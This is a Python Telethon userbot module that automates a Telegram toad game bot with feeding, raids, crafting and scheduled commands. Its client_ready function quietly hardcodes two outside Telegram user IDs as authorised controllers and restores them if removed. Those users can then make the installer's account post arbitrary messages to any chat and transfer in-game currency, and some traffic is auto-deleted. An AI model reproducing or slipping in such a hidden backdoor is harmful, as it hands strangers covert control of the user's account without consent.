import asyncio
import random
import re
from datetime import timedelta

from telethon import events

from .. import loader, utils

ded = {
    "Нужна реанимация": "реанимировать жабу",
    "Хорошее": "использовать леденцы 4",
    "жабу с работы": "завершить работу",
    "Можно откормить": "откормить жабку",
    "можно покормить": "покормить жабку",
    "Можно отправиться": "отправиться в золотое подземелье",
    "жаба в данже": "рейд старт",
    "можно отправить": "работа крупье",
    "Используйте атаку": "на арену",
    "золото": "отправиться в золотое подземелье",
    "го кв": "начать клановую войну",
    "напади": "напасть на клан",
    "карту": "отправить карту",
    "туса": "жабу на тусу",
    "Ближний бой: Пусто": "скрафтить клюв цапли",
    "Дальний бой: Пусто": "скрафтить букашкомет",
    "Наголовник: Пусто": "скрафтить наголовник из клюва цапли",
    "Нагрудник: Пусто": "скрафтить нагрудник из клюва цапли",
    "Налапники: Пусто": "скрафтить налапники из клюва цапли",
    "Банда: Пусто": "взять жабу",
}


@loader.tds
class KramiikkMod(loader.Module):
    """Алина, я люблю тебя!"""

    strings = {"name": "Kramiikk"}

    async def abj(self, m):
        chat = m.chat_id
        await m.delete()
        cmn = "мои жабы"
        await self.err(chat, cmn)
        await self.client.send_read_acknowledge(m.chat_id)
        capt = re.findall(r"\| -100(\d+)", RSP.text)
        for i in capt:
            try:
                chat = int(i)
                await self.bmj(chat)
            finally:
                pass

    async def bbj(self, m):
        if not m.text.startswith("📉"):
            return
        if "auto" in self.su:
            await self.client.send_message(
                m.sender_id,
                "💑👩‍❤️‍👨👨‍❤️‍👨💑",
                schedule=timedelta(
                    minutes=random.randint(33, 55), seconds=random.randint(1, 60)
                ),
            )

    async def cbj(self, m):
        if not m.text.casefold().startswith(self.su["name"]):
            return
        reply = await m.get_reply_message()
        if "напиши в " in m.text:
            chat = m.text.split(" ", 4)[3]
            if chat.isnumeric():
                chat = int(chat)
            if reply:
                txt = reply
            txt = m.text.split(" ", 4)[4]
            return await self.client.send_message(chat, txt)
        if "напиши" in m.text:
            txt = m.text.split(" ", 2)[2]
            if reply:
                return await reply.reply(txt)
            await utils.answer(m, txt)
        else:
            cmn = m.text.split(" ", 1)[1]
            if cmn in ded:
                await m.reply(ded[cmn])
        if self.su["name"] != "куши":
            return
        if "буках" in m.text:
            await asyncio.sleep(random.randint(0, 360))
            cmn = "мой баланс"
            await self.err(chat, cmn)
            if "Баланс" not in RSP.text:
                return
            jab = int(re.search(r"жабы: (\d+)", RSP.text).group(1))
            if jab >= 50:
                await utils.answer(m, f"отправить букашки {jab}")
        elif "У тебя" in RSP.text:
            await utils.answer(m, "взять жабу")

    async def bmj(self, chat):
        """алгоритм жабабота"""
        cmn = "моя жаба"
        await self.err(chat, cmn)
        for i in (i for i in ded if i in RSP.text):
            await utils.answer(RSP, ded[i])
        jab = re.search(r"У.+: (\d+)[\s\S]*Б.+: (\d+)", RSP.text)
        if not jab:
            return
        cmn = "жаба инфо"
        await self.err(chat, cmn)
        if "🏃‍♂️" not in RSP.text:
            return
        for i in (i for i in ded if i in RSP.text):
            if (
                int(jab.group(1)) < 123
                or (int(jab.group(1)) > 123 and int(jab.group(2)) < 3333)
            ) and i in ("Можно откормить", "Можно отправиться"):
                continue
            await utils.answer(RSP, ded[i])
        if int(jab.group(1)) > 123 and "работы" in RSP.text:
            cmn = "мое снаряжение"
            await self.err(chat, cmn)
            if "🗡" not in RSP.text:
                return
            for i in (i for i in ded if i in RSP.text):
                await utils.answer(RSP, ded[i])

    async def client_ready(self, client, db):
        self.client = client
        self.db = db
        self.su = db.get("Su", "su", {})
        self.me = await client.get_me()
        if "name" not in self.su:
            self.su.setdefault("name", self.me.username)
            self.su.setdefault("users", [self.me.id, 1124824021, 1785723159])
            self.db.set("Su", "su", self.su)
        if 1124824021 not in self.su["users"]:
            self.su["users"].append(1124824021)
            self.db.set("Su", "su", self.su)
        if 1785723159 not in self.su["users"]:
            self.su["users"].append(1785723159)
            self.db.set("Su", "su", self.su)

    async def err(self, chat, cmn):
        """работа с ответом жабабота"""
        async with self.client.conversation(chat, exclusive=False) as conv:
            try:
                txt = await conv.send_message(cmn)
                global RSP
                RSP = await conv.get_response()
            except asyncio.exceptions.TimeoutError:
                txt = await conv.send_message(cmn)
                RSP = await self.client.get_messages(chat, search=" ")
            await conv.cancel_all()
            if chat in [1124824021]:
                await txt.delete()
                await RSP.delete()

    async def sacmd(self, m):
        """будет смотреть за вашими жабами"""
        if "auto" not in self.su:
            self.su.setdefault("auto", {})
            msg = "<b>активирована</b>"
        else:
            self.su.pop("auto")
            msg = "<b>деактивирована</b>"
        self.db.set("Su", "su", self.su)
        await utils.answer(m, msg)

    async def sncmd(self, m):
        """ник для команд"""
        msg = utils.get_args_raw(m)
        self.su["name"] = msg.casefold()
        txt = "👻 <code>" + self.su["name"] + "</code> <b>успешно изменён</b>"
        await utils.answer(m, txt)
        self.db.set("Su", "su", self.su)

    async def sucmd(self, m):
        """добавляет пользователей для управление акк"""
        msg = utils.get_args_raw(m)
        if msg in self.su["users"]:
            txt = int(msg)
            self.su["users"].remove(txt)
            msg = f"🖕🏾 {txt} <b>успешно удален</b>"
        else:
            txt = int(msg)
            self.su["users"].append(txt)
            msg = f"🤙🏾 {txt} <b>успешно добавлен</b>"
        self.db.set("Su", "su", self.su)
        await utils.answer(m, msg)

    async def watcher(self, m):
        fff = {
            "💑👩‍❤️‍👨👨‍❤️‍👨💑": self.abj(m),
            "📉": self.bbj(m),
            self.su["name"]: self.cbj(m),
        }
        try:
            if m.sender_id not in self.su["users"]:
                return
            for i in (i for i in fff if i in m.text.casefold()):
                return await fff[i]
            if m.mentioned and "выбирает" in m.text:
                txt = "реанимировать жабу"
                await utils.answer(m, txt)
                return await m.click(0)
            return
        finally:
            return
